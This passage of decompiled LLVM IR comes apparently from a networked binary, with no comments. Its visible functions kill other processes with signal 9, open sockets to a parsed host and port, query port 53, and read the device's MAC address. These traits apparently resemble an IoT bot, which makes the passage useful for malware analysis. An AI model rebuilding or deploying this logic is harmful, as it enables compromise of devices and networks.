dec_label_pc_1000add4:                            ; preds = %dec_label_pc_1000adb0
  %tmp62 = icmp slt i32 %arg1, 6
  br i1 %tmp62, label %dec_label_pc_1000b110, label %dec_label_pc_1000ade0

dec_label_pc_1000ade0:                            ; preds = %dec_label_pc_1000add4
  %v1_1000ade4 = add i32 %tmp, 4
  %v1_1000ade8 = inttoptr i32 %v1_1000ade4 to i32*
  %v2_1000ade8 = load i32, i32* %v1_1000ade8, align 4
  store i32 %v2_1000ade8, i32* @r3, align 4
  store i32 268479992, i32* @lr, align 4
  %v2_1000adf4 = call i32 @function_1000de0c(i32 %v2_1000ade8, i32 44)
  %v3_1000adfc = icmp eq i32 %v2_1000adf4, 0
  br i1 %v3_1000adfc, label %dec_label_pc_1000af04, label %dec_label_pc_1000ae04

dec_label_pc_1000ae04:                            ; preds = %dec_label_pc_1000ade0
  %v2_1000ae0c = load i32, i32* %v1_1000ade8, align 4
  store i32 ptrtoint (i32* @global_var_10018d04.624 to i32), i32* @r4, align 4
  store i32 268480032, i32* @lr, align 4
  %v3_1000ae1c = call i32 @function_1000e454(i32 %v2_1000ae0c, i32 ptrtoint (i32* @global_var_10018d04.624 to i32), i32 268566528)
  %v3_1000aef815 = icmp eq i32 %v3_1000ae1c, 0
  br i1 %v3_1000aef815, label %dec_label_pc_1000afb4, label %dec_label_pc_1000ae2c.lr.ph

dec_label_pc_1000ae2c.lr.ph:                      ; preds = %dec_label_pc_1000ae04
  %v1_1000ae60 = add i32 %tmp, 12
  %v1_1000ae64 = inttoptr i32 %v1_1000ae60 to i32*
  %v1_1000ae8c = add i32 %tmp, 20
  %v1_1000ae90 = inttoptr i32 %v1_1000ae8c to i32*
  %v1_1000aea4 = add i32 %tmp, 24
  %v1_1000aea8 = inttoptr i32 %v1_1000aea4 to i32*
  br label %dec_label_pc_1000ae2c

dec_label_pc_1000ae2c:                            ; preds = %dec_label_pc_1000ae2c.lr.ph, %dec_label_pc_1000aedc
  store i32 268480048, i32* @lr, align 4
  %v0_1000ae2c = call i32 @function_10002bfc()
  %v3_1000ae34 = icmp eq i32 %v0_1000ae2c, 0
  br i1 %v3_1000ae34, label %dec_label_pc_1000ae3c, label %dec_label_pc_1000aedc

dec_label_pc_1000ae3c:                            ; preds = %dec_label_pc_1000ae2c
  %v2_1000ae44 = load i32, i32* %v1_1000ade8, align 4
  store i32 %v2_1000ae44, i32* @r29, align 4
  %v2_1000ae64 = load i32, i32* %v1_1000ae64, align 4
  store i32 268480112, i32* @lr, align 4
  %v2_1000ae6c = inttoptr i32 %v2_1000ae64 to i8*
  %v3_1000ae6c = call i32 @function_1000fa58(i8* %v2_1000ae6c, i32 %v1_1000ae60)
  %v1_1000ae74 = urem i32 %v3_1000ae6c, 65536
  store i32 %v1_1000ae74, i32* @r27, align 4
  %v2_1000ae90 = load i32, i32* %v1_1000ae90, align 4
  store i32 268480156, i32* @lr, align 4
  %v2_1000ae98 = inttoptr i32 %v2_1000ae90 to i8*
  %v3_1000ae98 = call i32 @function_1000fa58(i8* %v2_1000ae98, i32 %v1_1000ae8c)
  %v2_1000aea8 = load i32, i32* %v1_1000aea8, align 4
  store i32 268480180, i32* @lr, align 4
  %v2_1000aeb0 = inttoptr i32 %v2_1000aea8 to i8*
  %v3_1000aeb0 = call i32 @function_1000fa58(i8* %v2_1000aeb0, i32 %v1_1000aea4)
  %v0_1000aeb8 = load i32, i32* @r29, align 4
  %v0_1000aebc = load i32, i32* @r28, align 4
  %v0_1000aec0 = load i32, i32* @r27, align 4
  %v0_1000aec4 = load i32, i32* @r26, align 4
  %v0_1000aec8 = load i32, i32* @r25, align 4
  %v6_1000aed0 = trunc i32 %v0_1000aec0 to i16
  %v7_1000aed0 = call i32 @function_10009df8(i32 %v0_1000aeb8, i32 %v0_1000aebc, i16 %v6_1000aed0, i32 %v0_1000aec4, i32 %v0_1000aec8, i32 %v3_1000aeb0)
  %v1_1000aed8 = call i32 @function_1000c228(i32 0)
  br label %dec_label_pc_1000aedc

dec_label_pc_1000aedc:                            ; preds = %dec_label_pc_1000ae2c, %dec_label_pc_1000ae3c
  store i32 ptrtoint (i32* @global_var_10018d04.624 to i32), i32* @r4, align 4
  store i32 268480236, i32* @lr, align 4
  %v3_1000aee8 = call i32 @function_1000e454(i32 0, i32 ptrtoint (i32* @global_var_10018d04.624 to i32), i32 268566528)
  %v3_1000aef8 = icmp eq i32 %v3_1000aee8, 0
  br i1 %v3_1000aef8, label %dec_label_pc_1000afb4, label %dec_label_pc_1000ae2c

dec_label_pc_1000af04:                            ; preds = %dec_label_pc_1000ade0
  store i32 268480264, i32* @lr, align 4
  %v0_1000af04 = call i32 @function_10002bfc()
  %v3_1000af0c = icmp eq i32 %v0_1000af04, 0
  br i1 %v3_1000af0c, label %dec_label_pc_1000af14, label %dec_label_pc_1000b110

dec_label_pc_1000af14:                            ; preds = %dec_label_pc_1000af04
  %v2_1000af1c = load i32, i32* %v1_1000ade8, align 4
  store i32 %v2_1000af1c, i32* @r29, align 4
  %v1_1000af38 = add i32 %tmp, 12
  %v1_1000af3c = inttoptr i32 %v1_1000af38 to i32*
  %v2_1000af3c = load i32, i32* %v1_1000af3c, align 4
  store i32 268480328, i32* @lr, align 4
  %v2_1000af44 = inttoptr i32 %v2_1000af3c to i8*
  %v3_1000af44 = call i32 @function_1000fa58(i8* %v2_1000af44, i32 %v1_1000af38)
  %v1_1000af4c = urem i32 %v3_1000af44, 65536
  store i32 %v1_1000af4c, i32* @r27, align 4
  %v1_1000af64 = add i32 %tmp, 20
  %v1_1000af68 = inttoptr i32 %v1_1000af64 to i32*
  %v2_1000af68 = load i32, i32* %v1_1000af68, align 4
  store i32 268480372, i32* @lr, align 4
  %v2_1000af70 = inttoptr i32 %v2_1000af68 to i8*
  %v3_1000af70 = call i32 @function_1000fa58(i8* %v2_1000af70, i32 %v1_1000af64)
  %v1_1000af7c = add i32 %tmp, 24
  %v1_1000af80 = inttoptr i32 %v1_1000af7c to i32*
  %v2_1000af80 = load i32, i32* %v1_1000af80, align 4
  store i32 268480396, i32* @lr, align 4
  %v2_1000af88 = inttoptr i32 %v2_1000af80 to i8*
  %v3_1000af88 = call i32 @function_1000fa58(i8* %v2_1000af88, i32 %v1_1000af7c)
  %v0_1000af90 = load i32, i32* @r29, align 4
  %v0_1000af94 = load i32, i32* @r28, align 4
  %v0_1000af98 = load i32, i32* @r27, align 4
  %v0_1000af9c = load i32, i32* @r26, align 4
  %v0_1000afa0 = load i32, i32* @r25, align 4
  %v6_1000afa8 = trunc i32 %v0_1000af98 to i16
  %v7_1000afa8 = call i32 @function_10009df8(i32 %v0_1000af90, i32 %v0_1000af94, i16 %v6_1000afa8, i32 %v0_1000af9c, i32 %v0_1000afa0, i32 %v3_1000af88)
  %v1_1000afb0 = call i32 @function_1000c228(i32 0)
  br label %dec_label_pc_1000afb4

dec_label_pc_1000afb4:                            ; preds = %dec_label_pc_1000aedc, %dec_label_pc_1000ae04, %dec_label_pc_1000adb0, %dec_label_pc_1000af14
  %v2_1000afb8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_10018d88.660 to i32), i32* @r4, align 4
  %v3_1000afc8 = inttoptr i32 %v2_1000afb8 to i8*
  %v4_1000afc8 = call i32 @function_1000df0c(i8* %v3_1000afc8, i32 ptrtoint ([9 x i8]* @global_var_10018d88.660 to i32))
  %v3_1000afd0 = icmp eq i32 %v4_1000afc8, 0
  br i1 %v3_1000afd0, label %dec_label_pc_1000afd8, label %dec_label_pc_1000b0e4

dec_label_pc_1000afd8:                            ; preds = %dec_label_pc_1000afb4
  br label %dec_label_pc_1000b07c

dec_label_pc_1000afec:                            ; preds = %dec_label_pc_1000b07c, %dec_label_pc_1000b0c4
  %v1_1000aff0 = mul i32 %storemerge6, 4
  %v3_1000affc = load i32, i32* @global_var_1002b92c.52, align 4
  %v2_1000b000 = add i32 %v3_1000affc, %v1_1000aff0
  %v1_1000b004 = inttoptr i32 %v2_1000b000 to i32*
  %v2_1000b004 = load i32, i32* %v1_1000b004, align 4
  %v3_1000b008 = icmp eq i32 %v2_1000b004, 0
  br i1 %v3_1000b008, label %dec_label_pc_1000b070, label %dec_label_pc_1000b010

dec_label_pc_1000b010:                            ; preds = %dec_label_pc_1000afec
  %v2_1000b028 = load i32, i32* %v1_1000b004, align 4
  store i32 268480560, i32* @lr, align 4
  %v0_1000b02c = call i32 @function_1000c44c()
  %v4_1000b034 = icmp eq i32 %v2_1000b028, %v0_1000b02c
  br i1 %v4_1000b034, label %dec_label_pc_1000b070, label %dec_label_pc_1000b03c

dec_label_pc_1000b03c:                            ; preds = %dec_label_pc_1000b010
  %v3_1000b04c = load i32, i32* @global_var_1002b92c.52, align 4
  %v2_1000b050 = add i32 %v3_1000b04c, %v1_1000aff0
  %v1_1000b054 = inttoptr i32 %v2_1000b050 to i32*
  %v2_1000b054 = load i32, i32* %v1_1000b054, align 4
  store i32 268480612, i32* @lr, align 4
  %v2_1000b060 = call i32 @function_1000c4dc(i32 %v2_1000b054, i32 9)
  %v1_1000b068 = add i32 %stack_var_-148.1, 1
  br label %dec_label_pc_1000b070

dec_label_pc_1000b070:                            ; preds = %dec_label_pc_1000b010, %dec_label_pc_1000afec, %dec_label_pc_1000b03c
  %stack_var_-148.0 = phi i32 [ %stack_var_-148.1, %dec_label_pc_1000afec ], [ %stack_var_-148.1, %dec_label_pc_1000b010 ], [ %v1_1000b068, %dec_label_pc_1000b03c ]
  %v1_1000b074 = add i32 %storemerge6, 1
  br label %dec_label_pc_1000b07c

dec_label_pc_1000b07c:                            ; preds = %dec_label_pc_1000afd8, %dec_label_pc_1000b070
  %stack_var_-148.1 = phi i32 [ 0, %dec_label_pc_1000afd8 ], [ %stack_var_-148.0, %dec_label_pc_1000b070 ]
  %storemerge6 = phi i32 [ 0, %dec_label_pc_1000afd8 ], [ %v1_1000b074, %dec_label_pc_1000b070 ]
  %v2_1000b0a4 = load i32, i32* @global_var_1002b900.50, align 4
  %v3_1000b0bc = icmp eq i32 %v2_1000b0a4, 0
  br i1 %v3_1000b0bc, label %dec_label_pc_1000b0c4, label %dec_label_pc_1000afec

dec_label_pc_1000b0c4:                            ; preds = %dec_label_pc_1000b07c
  %v3_1000b0a8 = load i32, i32* @global_var_1002b904.51, align 4
  %v3_1000b0dc = icmp ugt i32 %v3_1000b0a8, %storemerge6
  br i1 %v3_1000b0dc, label %dec_label_pc_1000afec, label %dec_label_pc_1000b0e4

dec_label_pc_1000b0e4:                            ; preds = %dec_label_pc_1000b0c4, %dec_label_pc_1000afb4
  %v2_1000b0e8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_10018d94.661 to i32), i32* @r4, align 4
  %v3_1000b0f8 = inttoptr i32 %v2_1000b0e8 to i8*
  %v4_1000b0f8 = call i32 @function_1000df0c(i8* %v3_1000b0f8, i32 ptrtoint ([15 x i8]* @global_var_10018d94.661 to i32))
  %v3_1000b100 = icmp eq i32 %v4_1000b0f8, 0
  br i1 %v3_1000b100, label %dec_label_pc_1000b108, label %dec_label_pc_1000b110

dec_label_pc_1000b108:                            ; preds = %dec_label_pc_1000b0e4
  %v0_1000b10c = call i32 @function_1000fc20()
  br label %dec_label_pc_1000b110

dec_label_pc_1000b110:                            ; preds = %dec_label_pc_1000ac90, %dec_label_pc_1000aa78, %dec_label_pc_1000ac08, %dec_label_pc_1000ad88, %dec_label_pc_1000af04, %dec_label_pc_1000b0e4, %dec_label_pc_1000a8dc, %dec_label_pc_1000a868, %dec_label_pc_1000add4, %dec_label_pc_1000ac70, %dec_label_pc_1000ac64, %dec_label_pc_1000aa4c, %dec_label_pc_1000aa1c, %dec_label_pc_1000a9f8, %dec_label_pc_1000a9ec, %dec_label_pc_1000a904, %dec_label_pc_1000a820, %dec_label_pc_1000a7d0, %dec_label_pc_1000b108
  %v0_1000b138 = phi i32 [ %v3_1000aca0, %dec_label_pc_1000ac90 ], [ %v3_1000aa88, %dec_label_pc_1000aa78 ], [ %v0_1000ac08, %dec_label_pc_1000ac08 ], [ %v0_1000ad88, %dec_label_pc_1000ad88 ], [ %v0_1000af04, %dec_label_pc_1000af04 ], [ %v4_1000b0f8, %dec_label_pc_1000b0e4 ], [ 0, %dec_label_pc_1000a8dc ], [ 0, %dec_label_pc_1000a868 ], [ 0, %dec_label_pc_1000add4 ], [ %v3_1000ac80, %dec_label_pc_1000ac70 ], [ 0, %dec_label_pc_1000ac64 ], [ %v3_1000aa5c, %dec_label_pc_1000aa4c ], [ -1, %dec_label_pc_1000aa1c ], [ -1, %dec_label_pc_1000a9f8 ], [ 0, %dec_label_pc_1000a9ec ], [ %v0_1000a8ec, %dec_label_pc_1000a904 ], [ %v4_1000a838, %dec_label_pc_1000a820 ], [ %v4_1000a7e8, %dec_label_pc_1000a7d0 ], [ %v0_1000b10c, %dec_label_pc_1000b108 ]
  ret i32 %v0_1000b138

; uselistorder directives
  uselistorder i32 %storemerge6, { 1, 0, 2 }
  uselistorder i32 %stack_var_-148.1, { 0, 2, 1 }
  uselistorder i32 %v1_1000aff0, { 1, 0 }
  uselistorder i32* %v1_1000ade8, { 2, 0, 1, 3 }
  uselistorder i32 %v3_1000ad6c, { 1, 0 }
  uselistorder i32 %v3_1000acf0, { 1, 0 }
  uselistorder i32 %v3_1000acd4, { 1, 0 }
  uselistorder i32 %v2_1000acbc, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1000abec, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v2_1000aaec, { 1, 0 }
  uselistorder i32 %v3_1000aad8, { 1, 0 }
  uselistorder i32 %v3_1000aabc, { 1, 0 }
  uselistorder i32 %v2_1000aaa4, { 1, 0, 3, 2 }
  uselistorder i32 %tmp, { 4, 5, 6, 1, 2, 3, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 17 }
  uselistorder i32 (i32, i32, i32)* @function_1000a62c, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_1000a030, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10018d04.624 to i32), { 2, 8, 3, 9, 1, 10, 4, 11, 0, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_10017b38.43 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000b110, { 18, 5, 4, 8, 3, 0, 9, 10, 2, 1, 11, 12, 13, 14, 15, 6, 7, 16, 17 }
  uselistorder label %dec_label_pc_1000b07c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b070, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000afec, { 1, 0 }
  uselistorder label %dec_label_pc_1000afb4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000aedc, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae2c, { 1, 0 }
  uselistorder label %dec_label_pc_1000adb0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000ad60, { 1, 0 }
  uselistorder label %dec_label_pc_1000ad38, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac40, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000abe0, { 1, 0 }
  uselistorder label %dec_label_pc_1000aba8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ab5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000aa9c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a9c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a94c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a8b4, { 1, 0 }
}

define i32 @function_1000b13c() local_unnamed_addr {
dec_label_pc_1000b13c:
  %stack_var_-4120 = alloca i32, align 4
  %v2_1000b150 = ptrtoint i32* %stack_var_-4120 to i32
  store i32 268480872, i32* @lr, align 4
  %v3_1000b164 = call i32 @function_1000dd4c(i32 %v2_1000b150, i32 0, i32 4096)
  %v3_1000b16c = load i32, i32* @global_var_1002b8f8.42, align 4
  %v3_1000b170 = icmp eq i32 %v3_1000b16c, 0
  br i1 %v3_1000b170, label %dec_label_pc_1000b194, label %dec_label_pc_1000b178

dec_label_pc_1000b178:                            ; preds = %dec_label_pc_1000b13c
  store i32 268480904, i32* @lr, align 4
  %v1_1000b184 = call i32 @function_1000c2f4(i32 %v3_1000b16c)
  store i32 0, i32* @global_var_1002b8f8.42, align 4
  br label %dec_label_pc_1000b194

dec_label_pc_1000b194:                            ; preds = %dec_label_pc_1000b13c, %dec_label_pc_1000b178
  %v3_1000b198 = load i32, i32* @global_var_1002b8b8.662, align 4
  %v3_1000b19c = icmp eq i32 %v3_1000b198, 0
  br i1 %v3_1000b19c, label %dec_label_pc_1000b1a4, label %dec_label_pc_1000b1b4

dec_label_pc_1000b1a4:                            ; preds = %dec_label_pc_1000b194
  br label %dec_label_pc_1000b1c8

dec_label_pc_1000b1b4:                            ; preds = %dec_label_pc_1000b194
  %v1_1000b1bc = add i32 %v3_1000b198, 1
  br label %dec_label_pc_1000b1c8

dec_label_pc_1000b1c8:                            ; preds = %dec_label_pc_1000b1a4, %dec_label_pc_1000b1b4
  %storemerge = phi i32 [ 0, %dec_label_pc_1000b1a4 ], [ %v1_1000b1bc, %dec_label_pc_1000b1b4 ]
  store i32 %storemerge, i32* @global_var_1002b8b8.662, align 4
  %v1_1000b1dc = mul i32 %storemerge, 4
  %v2_1000b1e0 = add i32 %v1_1000b1dc, ptrtoint ([16 x i8]** @global_var_1002b8a0.664 to i32)
  %v1_1000b1e4 = inttoptr i32 %v2_1000b1e0 to i32*
  %v2_1000b1e4 = load i32, i32* %v1_1000b1e4, align 4
  %v2_1000b1f0 = inttoptr i32 %v2_1000b1e4 to i8*
  %v3_1000b1f0 = call i32 @function_1000df40(i32 %v2_1000b150, i8* %v2_1000b1f0)
  store i32 %v2_1000b150, i32* @r3, align 4
  store i32 268481028, i32* @lr, align 4
  %v2_1000b200 = call i32 @function_1000de0c(i32 %v2_1000b150, i32 58)
  %v3_1000b208 = icmp eq i32 %v2_1000b200, 0
  br i1 %v3_1000b208, label %dec_label_pc_1000b25c, label %dec_label_pc_1000b210

dec_label_pc_1000b210:                            ; preds = %dec_label_pc_1000b1c8
  store i32 %v2_1000b150, i32* @r3, align 4
  store i32 268481056, i32* @lr, align 4
  %v2_1000b21c = call i32 @function_1000de0c(i32 %v2_1000b150, i32 58)
  %v1_1000b224 = add i32 %v2_1000b21c, 1
  store i32 268481072, i32* @lr, align 4
  %v2_1000b22c = inttoptr i32 %v1_1000b224 to i8*
  %v3_1000b22c = call i32 @function_1000fa58(i8* %v2_1000b22c, i32 %v2_1000b21c)
  store i32 %v3_1000b22c, i32* @global_var_1002b8a4.665, align 4
  store i32 %v2_1000b150, i32* @r3, align 4
  store i32 268481100, i32* @lr, align 4
  %v2_1000b248 = call i32 @function_1000de0c(i32 %v2_1000b150, i32 58)
  %v3_1000b258 = inttoptr i32 %v2_1000b248 to i8*
  store i8 0, i8* %v3_1000b258, align 1
  br label %dec_label_pc_1000b25c

dec_label_pc_1000b25c:                            ; preds = %dec_label_pc_1000b1c8, %dec_label_pc_1000b210
  store i32 268481132, i32* @lr, align 4
  %v3_1000b268 = call i32 @function_1000ed5c(i32 2, i32 1, i32 0)
  store i32 %v3_1000b268, i32* @global_var_1002b8f8.42, align 4
  %v3_1000b288 = load i32, i32* @global_var_1002b8a4.665, align 4
  store i32 268481184, i32* @lr, align 4
  %v5_1000b29c = call i32 @function_1000296c(i32 %v3_1000b268, i32 %v2_1000b150, i32 %v3_1000b288, i32 30, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v3_1000b2a4 = icmp eq i32 %v5_1000b29c, 0
  %. = zext i1 %v3_1000b2a4 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_1000b150, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 66, { 1, 0 }
  uselistorder label %dec_label_pc_1000b25c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b1c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000b194, { 1, 0 }
}

define i32 @function_1000b2e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000b2e0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4160 = alloca i8, align 1
  %stack_var_-4164 = alloca i32, align 4
  %stack_var_-4180 = alloca i32, align 4
  %stack_var_-4196 = alloca i32, align 4
  store i32 268481284, i32* @lr, align 4
  %v3_1000b300 = call i32 @function_1000ed5c(i32 2, i32 2, i32 0)
  %v4_1000b314 = icmp eq i32 %v3_1000b300, -1
  br i1 %v4_1000b314, label %dec_label_pc_1000b31c, label %dec_label_pc_1000b328

dec_label_pc_1000b31c:                            ; preds = %dec_label_pc_1000b2e0
  br label %dec_label_pc_1000b554

dec_label_pc_1000b328:                            ; preds = %dec_label_pc_1000b2e0
  %v2_1000b328 = ptrtoint i32* %stack_var_-4196 to i32
  store i32 2, i32* %stack_var_-4196, align 4
  store i32 268481376, i32* @lr, align 4
  %v2_1000b35c = call i32 @function_1000e800(i32 ptrtoint ([8 x i8]* @global_var_10018da4.666 to i32))
  store i32 53, i32* @r3, align 4
  %v1_1000b36c = call i32 @function_1000e698(i32 53)
  store i32 268481420, i32* @lr, align 4
  %v3_1000b388 = call i32 @function_1000ebcc(i32 %v3_1000b300, i32 %v2_1000b328, i32 16)
  %v4_1000b39c = icmp eq i32 %v3_1000b388, -1
  br i1 %v4_1000b39c, label %dec_label_pc_1000b3a4, label %dec_label_pc_1000b3b0

dec_label_pc_1000b3a4:                            ; preds = %dec_label_pc_1000b328
  br label %dec_label_pc_1000b554

dec_label_pc_1000b3b0:                            ; preds = %dec_label_pc_1000b328
  store i32 16, i32* %stack_var_-4164, align 4
  %v2_1000b3b8 = ptrtoint i32* %stack_var_-4180 to i32
  %v2_1000b3bc = ptrtoint i32* %stack_var_-4164 to i32
  store i32 268481488, i32* @lr, align 4
  %v4_1000b3cc = call i32 @function_1000ec00(i32 %v3_1000b300, i32 %v2_1000b3b8, i32 %v2_1000b3bc, i32 %v2_1000b3bc)
  %v4_1000b3e0 = icmp eq i32 %v4_1000b3cc, -1
  br i1 %v4_1000b3e0, label %dec_label_pc_1000b3e8, label %dec_label_pc_1000b3f4

dec_label_pc_1000b3e8:                            ; preds = %dec_label_pc_1000b3b0
  br label %dec_label_pc_1000b554

dec_label_pc_1000b3f4:                            ; preds = %dec_label_pc_1000b3b0
  store i32 268481556, i32* @lr, align 4
  %v3_1000b410 = call i32 @function_1000c524(i32 ptrtoint ([16 x i8]* @global_var_10018dac.667 to i32), i32 0)
  %v2_1000b494 = ptrtoint i8* %stack_var_-4160 to i32
  br label %dec_label_pc_1000b494

dec_label_pc_1000b420:                            ; preds = %dec_label_pc_1000b494
  store i32 268481588, i32* @lr, align 4
  %v5_1000b430 = call i32 @function_1000e1b0(i32 %v2_1000b494, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10018dbc.668, i32 0, i32 0), i32 268566528)
  %v3_1000b438 = icmp eq i32 %v5_1000b430, 0
  br i1 %v3_1000b438, label %dec_label_pc_1000b47c, label %dec_label_pc_1000b458.preheader

dec_label_pc_1000b458.preheader:                  ; preds = %dec_label_pc_1000b420
  %v2_1000b45c10 = load i8, i8* %stack_var_-4160, align 1
  %v3_1000b46414 = icmp eq i8 %v2_1000b45c10, 9
  br i1 %v3_1000b46414, label %dec_label_pc_1000b46c, label %dec_label_pc_1000b44c

dec_label_pc_1000b44c:                            ; preds = %dec_label_pc_1000b458.preheader, %dec_label_pc_1000b44c
  %v4_1000b45815 = phi i32 [ %v1_1000b450, %dec_label_pc_1000b44c ], [ %v2_1000b494, %dec_label_pc_1000b458.preheader ]
  %v1_1000b450 = add i32 %v4_1000b45815, 1
  %v5_1000b454 = inttoptr i32 %v1_1000b450 to i8*
  %v2_1000b45c = load i8, i8* %v5_1000b454, align 1
  %v3_1000b464 = icmp eq i8 %v2_1000b45c, 9
  br i1 %v3_1000b464, label %dec_label_pc_1000b46c, label %dec_label_pc_1000b44c

dec_label_pc_1000b46c:                            ; preds = %dec_label_pc_1000b44c, %dec_label_pc_1000b458.preheader
  %storemerge4.lcssa = phi i8* [ %stack_var_-4160, %dec_label_pc_1000b458.preheader ], [ %v5_1000b454, %dec_label_pc_1000b44c ]
  store i8 0, i8* %storemerge4.lcssa, align 1
  br label %dec_label_pc_1000b4b4

dec_label_pc_1000b47c:                            ; preds = %dec_label_pc_1000b420
  store i32 268481684, i32* @lr, align 4
  %v3_1000b490 = call i32 @function_1000dd4c(i32 %v2_1000b494, i32 0, i32 4096)
  br label %dec_label_pc_1000b494

dec_label_pc_1000b494:                            ; preds = %dec_label_pc_1000b3f4, %dec_label_pc_1000b47c
  %v3_1000b4a4 = call i32 @function_10001d64(i32 %v2_1000b494, i32 4096, i32 %v3_1000b410)
  %v3_1000b4ac = icmp eq i32 %v3_1000b4a4, 0
  br i1 %v3_1000b4ac, label %dec_label_pc_1000b4b4, label %dec_label_pc_1000b420

dec_label_pc_1000b4b4:                            ; preds = %dec_label_pc_1000b494, %dec_label_pc_1000b46c
  store i32 268481724, i32* @lr, align 4
  %v1_1000b4b8 = call i32 @function_1000c2f4(i32 %v3_1000b410)
  %v3_1000b4bc = load i8, i8* %stack_var_-4160, align 1
  %v3_1000b4c4 = icmp eq i8 %v3_1000b4bc, 0
  br i1 %v3_1000b4c4, label %dec_label_pc_1000b548, label %dec_label_pc_1000b4cc

dec_label_pc_1000b4cc:                            ; preds = %dec_label_pc_1000b4b4
  %v2_1000b4cc = ptrtoint i32* %stack_var_-64 to i32
  %v3_1000b4dc = call i32 @function_1000df40(i32 %v2_1000b4cc, i8* nonnull %stack_var_-4160)
  store i32 ptrtoint (i32* @global_var_1000b4fc.669 to i32), i32* @lr, align 4
  %v3_1000b4f8 = call i32 @function_1000c048(i32 %v3_1000b300, i32 35111, i32 %v2_1000b4cc)
  %v2_1000b510 = ptrtoint i32* %stack_var_-46 to i32
  br label %dec_label_pc_1000b508

dec_label_pc_1000b508:                            ; preds = %dec_label_pc_1000b4cc, %dec_label_pc_1000b508
  %storemerge58 = phi i32 [ 0, %dec_label_pc_1000b4cc ], [ %v1_1000b534, %dec_label_pc_1000b508 ]
  %v2_1000b518 = add i32 %storemerge58, %v2_1000b510
  %v1_1000b51c = inttoptr i32 %v2_1000b518 to i8*
  %v2_1000b51c = load i8, i8* %v1_1000b51c, align 1
  %v4_1000b52c = add i32 %storemerge58, ptrtoint (i32* @global_var_1002b908.670 to i32)
  %v5_1000b52c = inttoptr i32 %v4_1000b52c to i8*
  store i8 %v2_1000b51c, i8* %v5_1000b52c, align 1
  %v1_1000b534 = add nuw nsw i32 %storemerge58, 1
  %tmp37 = icmp slt i32 %v1_1000b534, 6
  br i1 %tmp37, label %dec_label_pc_1000b508, label %dec_label_pc_1000b548

dec_label_pc_1000b548:                            ; preds = %dec_label_pc_1000b508, %dec_label_pc_1000b4b4
  store i32 ptrtoint (i32* @global_var_1000b550.671 to i32), i32* @lr, align 4
  %v1_1000b54c = call i32 @function_1000c2f4(i32 %v3_1000b300)
  br label %dec_label_pc_1000b55c

dec_label_pc_1000b554:                            ; preds = %dec_label_pc_1000b3e8, %dec_label_pc_1000b3a4, %dec_label_pc_1000b31c
  br label %dec_label_pc_1000b55c

dec_label_pc_1000b55c:                            ; preds = %dec_label_pc_1000b548, %dec_label_pc_1000b554
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_1000b554 ], [ %tmp, %dec_label_pc_1000b548 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %storemerge58, { 2, 1, 0 }
  uselistorder i32 %v1_1000b450, { 1, 0 }
  uselistorder i32 %v2_1000b494, { 3, 1, 0, 2 }
  uselistorder i32 %v3_1000b300, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4164, { 1, 0 }
  uselistorder i8* %stack_var_-4160, { 2, 4, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_1000e698, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b55c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b508, { 1, 0 }
  uselistorder label %dec_label_pc_1000b494, { 1, 0 }
  uselistorder label %dec_label_pc_1000b44c, { 1, 0 }
}

define i32 @function_1000b578() local_unnamed_addr {
dec_label_pc_1000b578:
  ret i32 ptrtoint ([8 x i8]* @global_var_10018dc8.672 to i32)
}

define i32 @function_1000b5a0() local_unnamed_addr {
dec_label_pc_1000b5a0:
  store i32 268481988, i32* @lr, align 4
  %v4_1000b5c0 = call i32 @function_1000c264(i32 ptrtoint ([16 x i8]* @global_var_10018dd0.673 to i32), i32 0, i32 268566528)
  %v4_1000b5cc = icmp eq i32 %v4_1000b5c0, -1
  %. = select i1 %v4_1000b5cc, i32 ptrtoint ([7 x i8]* @global_var_10018de8.675 to i32), i32 ptrtoint ([7 x i8]* @global_var_10018de0.674 to i32)
  ret i32 %.
}

define i32 @function_1000b610(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1000b610:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-5252 = alloca i32, align 4
  %stack_var_-5212 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-5320 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-5256 = alloca i32, align 4
  store i32 268482132, i32* @lr, align 4
